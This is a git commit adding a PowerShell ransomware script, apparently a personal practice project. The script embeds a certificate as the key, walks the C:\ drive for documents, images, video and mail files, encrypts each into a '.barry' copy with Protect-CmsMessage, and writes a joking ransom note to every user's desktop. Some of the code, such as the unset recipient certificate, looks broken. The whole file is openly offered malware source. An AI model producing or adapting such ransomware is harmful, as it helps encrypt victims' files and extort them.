d40f33496c8d00b673177d900ba7576412e8c9ae
BarrySploit <34023280+BarrySploit@users.noreply.github.com>
2022-07-12 22:23:05 -0600

    Add files via upload

---
+++ Powershell Practice/RansomBarry.ps1
@@ -0,0 +1,73 @@
+﻿#RANSOMWARE TIME!!!
+
+#Encryption Key
+$certificate = [Convert]::FromBase64String("MIIH+jCCBeKgAwIBAgITfgAAAAaY/KsVSIby2AAAAAAABjANBgkqhkiG9w0BAQsFADBFMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFzAVBgoJkiaJk/IsZAEZFgd0ZXN0aW5nMRMwEQYDVQQDEwpUZXN0aW5nLUNBMB4XDTIyMDcx
+MDIwMjEzNloXDTIzMDcxMDIwMjEzNlowgYQxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEXMBUGCgmSJomT8ixkARkWB3Rlc3RpbmcxDjAMBgNVBAMTBVVzZXJzMRYwFAYDVQQDEw1BZG1pbmlzdHJhdG9yMSowKAYJKoZIhvcNAQkB
+FhtBZG1pbmlzdHJhdG9yQFRFU1RJTkcuTE9DQUwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDHVEPERVBXc2d3IoK4QQgai1tLjIaBJZoFYZ8aBjH0rYSKWyux9ZDu0ySFe5uTa/muAVpDnzhO7MLUfsq0y1OjqyUJ
+iGWPvmaGUm0DbwcpZs2lXWzOdoce6ZRX/be4mz4a/Lc+9mnCvkWnhS0hky+3ME7aKWBy0dhMMBX7DJGaJOFymhzdocmgCRm2eWdQexqJYKSfvLS4xcDJR6SdufROndsLOBL+h49kFZs07lC8mCz/J8baBhAi99PUiIi3JAKDrY64
+O8tCXGFhDY8nQ4Osa2Pxhq0nGh/4D8h424iLcjqcSdj1jwpQTX/WzL83Ep6N8l3t0WNDgSN9WFsKezmFAgMBAAGjggOhMIIDnTA+BgkrBgEEAYI3FQcEMTAvBicrBgEEAYI3FQiBh5dnhMTREoO9gT6Ck/QmhIO0T4ESh/KtQYGE
+g0gCAWQCAQMwPgYDVR0lBDcwNQYIKwYBBQUHAwQGCisGAQQBgjcKAwQGCSsGAQQBgjdQAQYIKwYBBQUHAwMGCCsGAQUFBwMCMA4GA1UdDwEB/wQEAwIFoDBOBgkrBgEEAYI3FQoEQTA/MAoGCCsGAQUFBwMEMAwGCisGAQQBgjcK
+AwQwCwYJKwYBBAGCN1ABMAoGCCsGAQUFBwMDMAoGCCsGAQUFBwMCMIGUBgkqhkiG9w0BCQ8EgYYwgYMwCwYJYIZIAWUDBAEqMAsGCWCGSAFlAwQBLTALBglghkgBZQMEARYwCwYJYIZIAWUDBAEZMAsGCWCGSAFlAwQBAjALBglg
+hkgBZQMEAQUwCgYIKoZIhvcNAwcwBwYFKw4DAgcwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgICADAdBgNVHQ4EFgQUPBjWFJ3Ev6Ik57E8ooWdZ3TuEJIwHwYDVR0jBBgwFoAU7fYYKj3bI0RgO06n9CpL/zZS76cwgc0G
+A1UdHwSBxTCBwjCBv6CBvKCBuYaBtmxkYXA6Ly8vQ049VGVzdGluZy1DQSxDTj1Db250cm9sbGVyLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXRlc3Rp
+bmcsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG+BggrBgEFBQcBAQSBsTCBrjCBqwYIKwYBBQUHMAKGgZ5sZGFwOi8vL0NOPVRlc3Rpbmct
+Q0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9dGVzdGluZyxEQz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
+bkF1dGhvcml0eTBTBgNVHREETDBKoCsGCisGAQQBgjcUAgOgHQwbQWRtaW5pc3RyYXRvckB0ZXN0aW5nLmxvY2FsgRtBZG1pbmlzdHJhdG9yQFRFU1RJTkcuTE9DQUwwDQYJKoZIhvcNAQELBQADggIBAJ3I9vT21g8x8KlIX+8F
+9d5KnVJbuuYZfKRLPTIABW7/sNR7YfzxaMdVlItwa69PoHDsJn0TVRVoetmc7k0IO1BkT5lmm4ZVhOTcxiKyUDbJCIWty+Ea9yjbytvhBo+FJ35VhwDEh/TxHgLUTqWDdxYZQK213OAU4c9fnG6jPWKJgMpZ8hXAoyyCFLD8Bbbi
+FGViZeROfES2XXVKgOFwkNtvx2ADJQofNCaewYX3dYrx8AJ7/0zbKIVtXdVi1Au4XRfH1DyfhaMO8uInl26iwlcS/H291T20DJ3eruL7xKN0AI9V9HAG8f4mMfq4AwdFn+EKlYt4KGqQPB7ArfuIdQuSo64BW5Q0d9CXeQJ2PKGX
+L14ptSrlrF25FvE//cV/5qPHltYxcHQYDqBTSqIHvQ74BmoaYdZawUO15eHsgxkKOrLQO54j+/iiuQ09Z9/A1J9741P0nLhI+D/qHM+otfz+6j6l286ihThtnw26mDhfinOXpipuTlXmvlNnh/rn1ntWH+g7vqKghItLOy2qDM3e
+bHLlhbgrrWadmhG51mO3TkITHvkC5bsNxnL8GwYYs2VrUpRWvb4WLE93W7ZTOfFFOmlBkapqBt9kVLgyzYiGLIrDEFVvImb0hJj3JAiImRXibEq1mxXKIwMZQO9oAeByq8JLJGXcAPpEl9BMXPzh")
+[X509Certificate] $cert2 = $certificate 
+
+function Find-Files{
+    $files = @()
+    cd C:\
+    $types = @('txt','png','jpeg','jpg','tiff','pptx','ppt','pps','doc','docx','xls','xlsm','xlsx','pdf','mp4','wmv','rtf','odt','ost','pst','msg')
+    $exclusions = @('C:\Windows','C:\Program Files','C:\Program Files (x86)')
+    $folders = Get-ChildItem
+    foreach ($folder in $folders){
+        if ($folder.Fullname -in $exclusions){
+           Write-Host $folder.FullName
+           }
+        else{
+            cd $folder.Fullname
+            foreach($type in $types){
+                $search = '*.'+$type
+                $files += Get-ChildItem -Filter $search -Recurse 
+                }
+        cd C:\
+            }
+       
+        }
+    return $files
+}
+
+function Encrypt-Files{
+    param($encrypt)
+    foreach($file in $encrypt){
+        Write-Host 'Encrypting $file'
+        $path = $file.FullName
+        $newfile = $path+'.barry'
+        $newcert = 
+        Protect-CmsMessage -To $newcert -Path $path -OutFile $newfile
+        
+    }
+}
+function Create-RansomNote{
+    $note ="Your files have been encrypted! To decrypt them, go to my house and bring me a pizza. Then I will give you the private key."
+    cd C:\
+    cd Users
+    $users = Get-ChildItem -Exclude 'Public'
+    foreach ($user in $users){
+        $desktop = $user.FullName+'\Desktop'
+        New-Item $desktop\RansomNote.txt -force -Value $note -ErrorAction SilentlyContinue
+    }
+}
+
+function Start-Ransom{
+    $files = Find-Files
+    Encrypt-Files -encrypt $files
+    Create-RansomNote
+}
+
+Start-Ransom
